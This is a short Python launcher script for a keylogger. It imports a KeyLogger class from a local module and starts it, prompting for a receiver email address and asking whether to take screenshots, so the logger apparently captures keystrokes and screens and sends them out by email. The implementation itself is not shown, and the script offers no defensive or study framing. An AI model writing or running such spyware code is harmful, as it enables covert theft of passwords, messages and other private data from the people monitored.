from keylogger.keylogger import KeyLogger
logger = KeyLogger()
logger.keylogger(receiver_email=input('Receiver email : '),
                 ss=input('Takes screenshot ? (yes/no) : '))
